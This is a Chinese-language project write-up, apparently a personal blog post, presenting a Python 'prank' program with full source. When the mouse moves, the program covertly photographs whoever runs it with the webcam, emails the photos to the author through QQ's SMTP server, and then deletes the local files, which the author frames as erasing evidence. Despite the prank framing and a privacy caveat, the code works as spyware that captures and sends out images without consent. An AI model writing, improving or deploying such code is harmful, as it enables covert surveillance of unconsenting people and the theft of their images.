# 关于项目
## 起因
- 很久之前学习了python的CV库调用并打开电脑摄像头的程序；
- 之后又增加了按键盘的某个键就会拍照的功能；
- 然后我想有没有可能通过一些别的功能，将拍下的照片发送给我，不是为了获取什么隐私，只是与朋友之间大玩笑而已；
- 首先是自动拍照的功能的实现，我选了监控键盘和鼠标的动作的python库--pyinput。如果打开了应用程序，通过监控鼠标的运动，如果鼠标动了，就激活了程序，拍摄一定数量的照片；
- 然后就是将照片发送给我的功能实现，这起初确实是一个比较困难的事情，发送文件得借助第三方软件；
- 在我苦思冥想的时候，我想到了邮件，邮件，邮件！！！
- python有yagmail库，可以实现自动发送邮件；
- QQ邮箱可以打开STMP,POP3,IMAP等协议，实现远程调用QQ邮箱发送邮件的功能；
- 所以这个程序的出现也就水到渠成了；

## 程序目标

- 捕获打开程序的人的图片
- 将图片自动发送给我
- 程序需要较强的娱乐性，简单性
- 程序最好只在自己的朋友圈子中传递

## 选择编程语言

- python——Windows开发
- python的第三方库很多，及其方便于做一些新奇的小玩意

## 基本思路

#### opencv

- 通过opencv拍摄程序调用者的照片
- opencv可以方便的对拍摄的照片进行保存

####  程序触发方式

- 直接触发/手动触发

#### 图片发送方式

- 思来想去，觉得最方便的应该是邮件的方式了
- 自动化邮件之类的项目应该是一个比较成熟的了

#### 程序测试方式

- 测试对象是：朋友们，因为使用照片拍摄，涉及到了个人隐私问题，程序不便于广泛地传播


# 项目完整代码

``` python
# -*- coding : utf-8 -*-
# Time       : 2021/7/26 10:08
# Author     : MurphyHou
# Proj_Name  : cv_capture
# File_Name  : capture_demo4.py
# Software   : PyCharm
# =======Here We Go!=======

#设置把程序运行过程中拍摄的照片在发送成功之后删除掉
import cv2
from pynput.mouse import Listener
import yagmail
import os

mouse_return=0

def on_move(x,y):# 监听鼠标的位置
    # print("mouse:{}".format(x,y))
    global mouse_return
    mouse_return=x

    return False  # 不能返回True,否则程序不会停止


def send_mail():
    # 设置邮箱服务器
    mail_host="smtp.qq.com"
    # 设置发送方邮箱————最好使用小号邮箱吧，免得引发什么误会
    mail_sender='xxx.qq.com'
    # 设置发送方邮箱密码
    mail_pass="xxxxx"
    # 设置接受方邮箱————最好使用小号邮箱吧，免得引发什么误会
    mail_receiver='xxx.qq.com'
    # mail_receiver['xxx.qq.com','xxx.163.com','xxx.outlook.com'] # 设置多个接收方

    yag = yagmail.SMTP(user=mail_sender,password=mail_pass,host=mail_host)

    contents=\
        ['capture pictures',#邮件正文中写入文字
         yagmail.inline('MurphyHou_capture_5.jpg'),# 邮件正文中直接插入照片
         'MurphyHou_capture_1.jpg',# 邮件中按附件方式发送图片
         'MurphyHou_capture_2.jpg',
         'MurphyHou_capture_3.jpg',
         'MurphyHou_capture_4.jpg',
         'MurphyHou_capture_6.jpg',
         'MurphyHou_capture_7.jpg',
         'MurphyHou_capture_8.jpg',
         'MurphyHou_capture_9.jpg',
         'MurphyHou_capture_10.jpg'
         ]
    try:

        yag.send(to=mail_receiver,subject="from yagmail_cv_capture",contents=contents)
        print("Send Success!")
    except Exception as error:
        print("Error:",error)


def delete():
    for i in range(1,11):
        file_name="MurphyHou_capture_"+str(i)+".jpg"
        
        if os.path.isfile(file_name):
            os.remove(file_name)
        else:
            print("fie {} doesn't exit!".format(file_name))

    print("Delete Success!")


if __name__=="__main__":
    with Listener(on_move=on_move) as listener:
        listener.join()

    cap=cv2.VideoCapture(0)#创建对象
    num=1
    while(cap.isOpened()):#当摄像头被打开时，循环捕捉帧
        while(num<11):#设置拍摄10张照片
            ret_flag, image_show = cap.read()  # 函数返回值是有两个参数
            cv2.imshow("Capture", image_show)  # 创建窗口，窗口的显示值为捕捉的图像，名称为Capture
            if mouse_return!=0:  # 当鼠标发生移动时触发程序
                # 设置窗口大小
                cap.get(4)
                cap.get(3)

                # print("success:"+str(num))
                cv2.imwrite("MurphyHou_capture_"+str(num) + ".jpg", image_show)
                num += 1

        cap.release()
        cv2.destroyAllWindows()   #放到检测摄像头是否处于开状态的while循环之内，就能保证窗口在程序运行结束之后可以自动关闭

        send_mail()

        delete()#绝对删除，不会存在回收站中
```



# 关于项目的思考

## 程序的优点

- 比较好得实现了目标的功能，符合预期
- 程序本身的功能并不是有多少很大的用处，更多的的是朋友之间的玩笑，更重要的是用程序实现了这个功能的过程中，学会了一点点OpenCV的一些基本的使用，以及yagmail自动化邮件的现实，总结就是，实现这个没有多少用的程序过程中学到的一些使用是重要的！

## 程序尚存的不足(可以改进的方向)

- ~~程序运行结束后，拍摄的照片（程序运行过的证据doge），删除问题~~（已添加此功能）
- 图片保存路径问题
  - 因为无法确定程序运行者将程序下载到了什么路径，目前采用的是将图片直接保存到改程序保存的路径下。这样做的问题是，如果将程序保存到了C盘（包括桌面）中，由于权限问题，图片可能因为没有权限，不能保存；
  - 可能的改进方向是：首先检测计算机的磁盘信息，判断有多少个磁盘，如果有出去C盘外的其他盘，则将图片保存到其他盘，否则保存到程序所保存的位置！
- 邮件发送的最大次数
  - 邮箱都有发送的最大次数，超过这个次数当日便不能发送了
  - 这个问题好像不太容易解决，程序无法判断程序今天已经发送过多少次了
- 对电脑硬件有要求
  - 现在很多电脑都没有摄像头，那肯定没办法拍照片的

## 对程序本身的反思

- 因为涉及到人像的拍摄，会涉及到个人隐私问题，所以程序本身并不可以广泛传播

